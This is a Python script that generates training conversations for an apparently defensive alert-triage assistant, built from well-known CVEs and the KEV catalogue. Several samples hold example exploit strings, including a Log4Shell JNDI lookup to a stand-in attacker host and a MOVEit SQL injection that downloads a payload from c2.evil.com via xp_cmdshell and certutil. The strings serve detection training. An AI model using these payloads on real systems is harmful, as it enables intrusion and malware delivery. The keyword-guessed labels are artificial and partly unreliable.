#!/usr/bin/env python3
"""Generate training samples from CVE data.

Includes:
  - 8 hand-crafted CVE-grounded samples (from Grok)
  - Auto-generator that reads KEV cache and creates alert samples

Usage:
    python gen_cve_samples.py                    # just the 8 hand-crafted
    python gen_cve_samples.py --from-kev 50      # + 50 auto-generated from KEV
    python gen_cve_samples.py --from-kev 50 --refresh  # regenerate
"""

import argparse
import json
import random
from pathlib import Path

TRAINING_DIR = Path(__file__).parent.parent
DATA_DIR = TRAINING_DIR / "data"
CACHE_DIR = TRAINING_DIR / "cve_cache"

# System prompt placeholder — will be replaced by prepare.py from config
SYSTEM_PROMPT = "PLACEHOLDER"

MITRE_TECHNIQUES = {
    "T1190": "Exploit Public-Facing Application",
    "T1505.003": "Server Software Component: Web Shell",
    "T1068": "Exploitation for Privilege Escalation",
    "T1195.002": "Compromise Software Supply Chain",
    "T1210": "Exploitation of Remote Services",
    "T1203": "Exploitation for Client Execution",
    "T1059.001": "Command and Scripting Interpreter: PowerShell",
    "T1059.003": "Command and Scripting Interpreter: Windows Command Shell",
    "T1078": "Valid Accounts",
    "T1133": "External Remote Services",
    "T1055": "Process Injection",
    "T1486": "Data Encrypted for Impact",
    "T1496": "Resource Hijacking",
    "T1021.002": "Remote Services: SMB/Windows Admin Shares",
}


def sift_block(gate: str, conf: float) -> str:
    gates = {
        "injection_sql": {"detected": False, "confidence": round(random.uniform(0.08, 0.20), 2)},
        "injection_cmd": {"detected": False, "confidence": round(random.uniform(0.06, 0.18), 2)},
        "ssrf": {"detected": False, "confidence": round(random.uniform(0.05, 0.16), 2)},
        "path_traversal": {"detected": False, "confidence": round(random.uniform(0.08, 0.22), 2)},
    }
    gates[gate]["detected"] = True
    gates[gate]["confidence"] = conf
    return json.dumps(
        {
            "recommendation": "BLOCK",
            "risk_score": conf,
            "flags": [{"gate": g, **v} for g, v in gates.items()],
        }
    )


def sift_pass() -> str:
    return json.dumps(
        {
            "recommendation": "PASS",
            "risk_score": round(random.uniform(0.05, 0.18), 2),
            "flags": [
                {
                    "gate": "ssrf",
                    "detected": False,
                    "confidence": round(random.uniform(0.05, 0.15), 2),
                },
                {
                    "gate": "injection_cmd",
                    "detected": False,
                    "confidence": round(random.uniform(0.05, 0.12), 2),
                },
                {
                    "gate": "injection_sql",
                    "detected": False,
                    "confidence": round(random.uniform(0.06, 0.15), 2),
                },
                {
                    "gate": "path_traversal",
                    "detected": False,
                    "confidence": round(random.uniform(0.05, 0.18), 2),
                },
            ],
        }
    )


def make_sample(
    alert: str,
    classify_text: str,
    gate: str,
    conf: float,
    verdict: str,
    quality: str = "A",
    extra_turns: list | None = None,
) -> dict:
    convs = [
        {"from": "system", "value": SYSTEM_PROMPT},
        {"from": "human", "value": alert},
        {
            "from": "gpt",
            "value": json.dumps({"name": "sift_classify", "arguments": {"text": classify_text}}),
        },
        {"from": "human", "value": sift_block(gate, conf)},
    ]
    if extra_turns:
        convs.extend(extra_turns)
    convs.append({"from": "gpt", "value": verdict})
    return {"conversations": convs, "quality": quality}


def make_dfir_sample(
    alert: str,
    classify_text: str,
    tool: str,
    tool_args: dict,
    tool_resp: dict,
    verdict: str,
    quality: str = "A",
) -> dict:
    convs = [
        {"from": "system", "value": SYSTEM_PROMPT},
        {"from": "human", "value": alert},
        {
            "from": "gpt",
            "value": json.dumps({"name": "sift_classify", "arguments": {"text": classify_text}}),
        },
        {"from": "human", "value": sift_pass()},
        {"from": "gpt", "value": json.dumps({"name": tool, "arguments": tool_args})},
        {"from": "human", "value": json.dumps(tool_resp)},
        {"from": "gpt", "value": verdict},
    ]
    return {"conversations": convs, "quality": quality}


# ── Hand-crafted CVE samples (from Grok + expanded) ─────────

HANDCRAFTED = []

# Log4Shell (CVE-2021-44228)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: EDR-2026-LOG4J-01 [critical] host=web-prod-42 process=tomcat — HTTP request contains JNDI lookup: ${jndi:ldap://attacker.example.com/a}. CVE-2021-44228 exploitation attempt. Outbound LDAP connection initiated from Java process. T1190 Exploit Public-Facing Application.",
        "${jndi:ldap://attacker.example.com/a}",
        "ssrf",
        0.96,
        "Verdict: BLOCK — Log4Shell (CVE-2021-44228) JNDI injection detected — SSRF via LDAP lookup to attacker.example.com (ssrf gate, MITRE T1190)",
        "A",
    )
)

# ProxyShell (CVE-2021-34473 + CVE-2021-34523)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: EDR-2026-PROXY-01 [high] host=exchange-03 process=w3wp.exe — Autodiscover SSRF + arbitrary file write chain (CVE-2021-34473, CVE-2021-34523). POST to /autodiscover/autodiscover.json with malicious XML. Web shell dropped to aspnet_client path. T1190 + T1505.003.",
        "POST to /autodiscover/autodiscover.json with malicious XML targeting CVE-2021-34473",
        "ssrf",
        0.95,
        "Verdict: BLOCK — ProxyShell exploitation chain detected (CVE-2021-34473/34523) — SSRF via Autodiscover endpoint with web shell deployment (ssrf gate, MITRE T1190/T1505.003)",
        "A",
    )
)

# PrintNightmare (CVE-2021-34527)
HANDCRAFTED.append(
    make_dfir_sample(
        "Security Alert: EDR-2026-PRINT-01 [high] host=dc-01 process=spoolsv.exe — RpcAddPrinterDriverEx call with malicious DLL (CVE-2021-34527). Print Spooler service attempting to load driver from SMB share. SYSTEM-level privilege escalation attempt. T1068. Memory dump: /evidence/dc01.vmem",
        "PrintNightmare CVE-2021-34527 RpcAddPrinterDriverEx privilege escalation on dc-01",
        "vol_pslist",
        {"image_path": "/evidence/dc01.vmem"},
        {
            "processes": [
                {
                    "PID": 1204,
                    "PPID": 680,
                    "ImageFileName": "spoolsv.exe",
                    "CreateTime": "2026-05-30T03:15:00",
                },
                {
                    "PID": 1210,
                    "PPID": 1204,
                    "ImageFileName": "rundll32.exe",
                    "CreateTime": "2026-05-30T03:15:02",
                },
            ],
            "suspicious_processes": [
                {
                    "PID": 1210,
                    "ImageFileName": "rundll32.exe",
                    "matched_fragment": "spoolsv_child_rundll32",
                    "attack_technique": {
                        "id": "T1068",
                        "name": "Exploitation for Privilege Escalation",
                    },
                }
            ],
            "suspicious_count": 1,
        },
        "Verdict: BLOCK — PrintNightmare (CVE-2021-34527) exploitation confirmed — spoolsv.exe spawned rundll32.exe with malicious DLL (PID 1210, MITRE T1068 Privilege Escalation)",
        "A",
    )
)

# XZ Utils supply-chain (CVE-2024-3094)
HANDCRAFTED.append(
    make_dfir_sample(
        "Security Alert: EDR-2026-XZ-01 [critical] host=build-07 process=sshd — Modified xz/liblzma with backdoor (CVE-2024-3094). sshd authentication hook injected via liblzma. Unauthorized remote access capability detected. T1195.002. Scan target: /usr/lib/liblzma.so.5",
        "CVE-2024-3094 xz-utils supply chain backdoor on build-07",
        "clamav_scan",
        {"target_path": "/usr/lib/liblzma.so.5"},
        {
            "infected": True,
            "virus_name": "Backdoor.Linux.XZBackdoor-3094",
            "file": "/usr/lib/liblzma.so.5",
            "action": "quarantined",
        },
        "Verdict: BLOCK — XZ Utils supply-chain backdoor (CVE-2024-3094) confirmed — trojanized liblzma.so.5 detected by ClamAV (Backdoor.Linux.XZBackdoor-3094, MITRE T1195.002)",
        "A",
    )
)

# Spring4Shell (CVE-2022-22965)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: WAF-2026-SPRING-01 [critical] host=app-prod-08 — Spring4Shell (CVE-2022-22965) exploitation attempt. POST to /spring-app with class.module.classLoader.resources.context.parent.pipeline.first.pattern manipulation. RCE via class loader modification. T1190.",
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
        "injection_cmd",
        0.94,
        "Verdict: BLOCK — Spring4Shell (CVE-2022-22965) RCE attempt detected — class loader manipulation via parameter binding (injection_cmd gate, MITRE T1190)",
        "A",
    )
)

# DirtyPipe (CVE-2022-0847)
HANDCRAFTED.append(
    make_dfir_sample(
        "Security Alert: EDR-2026-DPIPE-01 [critical] host=k8s-worker-03 — DirtyPipe (CVE-2022-0847) privilege escalation. Pipe splice overwrite of /etc/passwd detected. Unprivileged user gained root. T1068. Memory dump: /evidence/k8sworker03.vmem",
        "DirtyPipe CVE-2022-0847 pipe splice privilege escalation",
        "vol_pslist",
        {"image_path": "/evidence/k8sworker03.vmem"},
        {
            "processes": [
                {
                    "PID": 31200,
                    "PPID": 1,
                    "ImageFileName": "exploit_dp",
                    "CreateTime": "2026-05-30T05:22:00",
                }
            ],
            "suspicious_processes": [
                {
                    "PID": 31200,
                    "ImageFileName": "exploit_dp",
                    "matched_fragment": "dirtypipe",
                    "attack_technique": {
                        "id": "T1068",
                        "name": "Exploitation for Privilege Escalation",
                    },
                }
            ],
            "suspicious_count": 1,
        },
        "Verdict: BLOCK — DirtyPipe (CVE-2022-0847) privilege escalation confirmed — exploit binary detected in memory (PID 31200, MITRE T1068)",
        "A",
    )
)

# MOVEit Transfer (CVE-2023-34362)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: WAF-2026-MOVEIT-01 [critical] host=moveit-prod-01 — MOVEit Transfer SQL injection (CVE-2023-34362). Malicious payload in X-siLock-Transaction header. Cl0p ransomware campaign pattern. Attempted data exfiltration via file transfer API. T1190.",
        "X-siLock-Transaction: '; EXEC xp_cmdshell 'certutil -urlcache -f http://c2.evil.com/payload.exe c:\\temp\\payload.exe'--",
        "injection_sql",
        0.97,
        "Verdict: BLOCK — MOVEit Transfer SQLi (CVE-2023-34362) detected — SQL injection with xp_cmdshell payload download in transaction header (injection_sql gate, MITRE T1190, Cl0p campaign pattern)",
        "A",
    )
)

# Citrix Bleed (CVE-2023-4966)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: IDS-2026-CITRIX-01 [critical] host=netscaler-01 — Citrix Bleed (CVE-2023-4966) session token theft. Oversized HTTP Host header causing buffer over-read. Session token leaked in response. Lockbit 3.0 campaign indicator. T1190.",
        "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1\r\nHost: " + "A" * 24576,
        "ssrf",
        0.93,
        "Verdict: BLOCK — Citrix Bleed (CVE-2023-4966) exploitation attempt detected — oversized Host header triggering buffer over-read for session token theft (ssrf gate, MITRE T1190, LockBit 3.0 indicator)",
        "B",
    )
)

# Confluence RCE (CVE-2023-22515)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: WAF-2026-CONFL-01 [critical] host=confluence-01 — Confluence broken access control (CVE-2023-22515). POST to /setup/setupadministrator.action creating unauthorized admin account. Nation-state attribution (Storm-0062). T1190 + T1078.",
        "POST /setup/setupadministrator.action creating unauthorized admin account CVE-2023-22515",
        "injection_cmd",
        0.92,
        "Verdict: BLOCK — Confluence CVE-2023-22515 exploitation detected — unauthorized admin creation via setup endpoint bypass (injection_cmd gate, MITRE T1190/T1078, Storm-0062 campaign indicator)",
        "B",
    )
)

# PaperCut RCE (CVE-2023-27350)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: EDR-2026-PAPER-01 [high] host=print-srv-02 — PaperCut NG/MF RCE (CVE-2023-27350). Authentication bypass + scripting interface abuse. SetupCompleted page accessible without auth. Bl00dy ransomware and Cl0p campaigns. T1190 + T1059.",
        "GET /app?service=page/SetupCompleted with server-side script execution CVE-2023-27350",
        "injection_cmd",
        0.91,
        "Verdict: BLOCK — PaperCut RCE (CVE-2023-27350) detected — authentication bypass via SetupCompleted endpoint with script execution (injection_cmd gate, MITRE T1190/T1059, Bl00dy/Cl0p campaign pattern)",
        "B",
    )
)

# FortiOS SSL-VPN (CVE-2024-21762)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: IDS-2026-FORTI-01 [critical] host=fw-edge-01 — FortiOS SSL-VPN out-of-bound write (CVE-2024-21762). Crafted HTTP request to /remote/logincheck targeting heap overflow. Pre-authentication RCE. Active exploitation by APT groups. T1190.",
        "POST /remote/logincheck with heap overflow payload targeting CVE-2024-21762",
        "injection_cmd",
        0.95,
        "Verdict: BLOCK — FortiOS SSL-VPN CVE-2024-21762 exploitation attempt detected — pre-auth heap overflow via /remote/logincheck (injection_cmd gate, MITRE T1190, active APT exploitation)",
        "A",
    )
)

# ScreenConnect (CVE-2024-1709)
HANDCRAFTED.append(
    make_sample(
        "Security Alert: EDR-2026-SCREEN-01 [critical] host=rmm-01 — ConnectWise ScreenConnect auth bypass (CVE-2024-1709). Path traversal to setup wizard re-initialization. Unauthenticated admin account creation. LockBit affiliate activity. T1190 + T1078.",
        "/SetupWizard.aspx/../../../SetupWizard.aspx unauthorized admin creation CVE-2024-1709",
        "path_traversal",
        0.96,
        "Verdict: BLOCK — ScreenConnect auth bypass (CVE-2024-1709) detected — path traversal to setup wizard for unauthorized admin creation (path_traversal gate, MITRE T1190/T1078, LockBit affiliate indicator)",
        "A",
    )
)


# ── Auto-generator from KEV cache ───────────────────────────

GATE_KEYWORDS = {
    "ssrf": ["ssrf", "redirect", "request forgery", "metadata", "proxy", "url"],
    "injection_sql": ["sql injection", "sqli", "database", "query", "improper input"],
    "injection_cmd": [
        "remote code execution",
        "rce",
        "command injection",
        "code execution",
        "deserialization",
        "buffer overflow",
        "arbitrary code",
        "scripting",
    ],
    "path_traversal": [
        "path traversal",
        "directory traversal",
        "file inclusion",
        "arbitrary file",
        "file read",
        "file write",
        "file upload",
    ],
}


def guess_gate(description: str) -> tuple[str, float]:
    """Guess the most likely security gate from CVE description."""
    desc_lower = description.lower()
    scores = {}
    for gate, keywords in GATE_KEYWORDS.items():
        scores[gate] = sum(1 for kw in keywords if kw in desc_lower)
    best = max(scores, key=scores.get)
    if scores[best] == 0:
        best = "injection_cmd"
    conf = min(0.98, 0.85 + scores[best] * 0.03)
    return best, round(conf, 2)


def kev_to_sample(record: dict) -> dict | None:
    """Convert a KEV record into a training sample."""
    cve = record["cve_id"]
    vendor = record["vendor"]
    product = record["product"]
    name = record["name"]
    desc = record["description"]

    if not desc or len(desc) < 20:
        return None

    gate, conf = guess_gate(desc)
    ransomware = record.get("known_ransomware", "Unknown") == "Known"
    quality = "A" if ransomware else "B"

    alert = (
        f"Security Alert: CVE-SCAN [{cve}] vendor={vendor} product={product} — "
        f"{name}. {desc}" + (" Known ransomware campaign use." if ransomware else "")
    )

    classify_text = f"{cve} {name} {desc[:100]}"

    verdict = (
        f"Verdict: BLOCK — {cve} ({vendor} {product}) exploitation pattern detected — "
        f"{name} ({gate} gate, confidence {conf})"
        + (", known ransomware campaign" if ransomware else "")
    )

    return make_sample(alert, classify_text, gate, conf, verdict, quality)


def generate_from_kev(count: int) -> list[dict]:
    """Generate training samples from cached KEV data."""
    kev_path = CACHE_DIR / "kev_parsed.jsonl"
    if not kev_path.exists():
        print("  KEV cache not found. Run fetch_cves.py first.")
        return []

    records = [json.loads(l) for l in open(kev_path) if l.strip()]
    random.shuffle(records)

    samples = []
    for r in records:
        if len(samples) >= count:
            break
        s = kev_to_sample(r)
        if s:
            samples.append(s)

    return samples


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--from-kev", type=int, default=0, help="Number of auto-generated samples from KEV cache"
    )
    parser.add_argument("--refresh", action="store_true", help="Regenerate output file")
    args = parser.parse_args()

    output_path = DATA_DIR / "batch_5_cve_grounded.jsonl"

    if output_path.exists() and not args.refresh:
        existing = sum(1 for _ in open(output_path))
        print(
            f"batch_5_cve_grounded.jsonl already exists ({existing} samples). Use --refresh to regenerate."
        )
        return

    samples = list(HANDCRAFTED)
    print(f"Hand-crafted CVE samples: {len(samples)}")

    if args.from_kev > 0:
        kev_samples = generate_from_kev(args.from_kev)
        samples.extend(kev_samples)
        print(f"KEV auto-generated: {len(kev_samples)}")

    random.shuffle(samples)

    with open(output_path, "w") as f:
        for s in samples:
            f.write(json.dumps(s) + "\n")

    print(f"Total: {len(samples)} → {output_path}")

    # Validate
    errors = 0
    for i, line in enumerate(open(output_path)):
        d = json.loads(line)
        assert "conversations" in d
        assert d["conversations"][-1]["from"] == "gpt"
        assert "Verdict:" in d["conversations"][-1]["value"]
    print(f"Validation: {len(samples)} samples, {errors} errors")


if __name__ == "__main__":
    main()
